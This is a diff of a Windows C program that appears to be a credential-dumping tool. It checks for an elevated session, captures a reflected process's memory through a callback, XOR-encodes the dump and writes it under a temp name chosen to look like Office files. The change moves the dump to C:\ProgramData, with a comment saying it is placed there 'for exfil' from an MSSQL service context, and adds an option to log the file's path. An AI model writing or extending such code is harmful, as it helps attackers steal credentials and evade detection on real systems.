@@ -114,8 +114,12 @@ static BOOL CALLBACK DiagBufferCallback(
     return TRUE;
 }
 
-int main()
+int wmain(int argc, wchar_t* argv[])
 {
+    LPCWSTR outLogPath = NULL;
+    if (argc >= 3 && wcscmp(argv[1], L"-o") == 0)
+        outLogPath = argv[2];
+
     if (!IsElevatedSession())
     {
         printf("[ERR] Insufficient privileges\n");
@@ -228,11 +232,9 @@ int main()
 
     XorEncode(g_DiagBuffer, g_BufferOffset);
 
-    // Output to %TEMP%\~DFxxxx.tmp — matches MS Office / shell temp pattern.
-    WCHAR tmpDir[MAX_PATH]  = { 0 };
+    // Output to C:\ProgramData\DFxxxx.tmp — accessible from MSSQL service context for exfil.
     WCHAR tmpFile[MAX_PATH] = { 0 };
-    if (!GetTempPathW(MAX_PATH, tmpDir) ||
-        !GetTempFileNameW(tmpDir, L"DF", 0, tmpFile))
+    if (!GetTempFileNameW(L"C:\\ProgramData", L"DF", 0, tmpFile))
     {
         printf("[ERR] Temp path query failed\n");
         TerminateProcess(hReflectionProcess, 0);
@@ -266,7 +268,23 @@ int main()
     TerminateProcess(hReflectionProcess, 0);
     CloseHandle(hReflectionProcess);
 
-    // Print the random temp path so operator can locate the output.
     wprintf(L"%s\n", tmpFile);
+
+    if (outLogPath)
+    {
+        HANDLE hLog = CreateFileW(outLogPath, GENERIC_WRITE, 0, NULL,
+                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hLog != INVALID_HANDLE_VALUE)
+        {
+            char buf[MAX_PATH * 2];
+            int n = WideCharToMultiByte(CP_ACP, 0, tmpFile, -1, buf, sizeof(buf), NULL, NULL);
+            DWORD w;
+            if (n > 1)
+                WriteFile(hLog, buf, n - 1, &w, NULL);
+            WriteFile(hLog, "\r\n", 2, &w, NULL);
+            CloseHandle(hLog);
+        }
+    }
+
     return 0;
 }
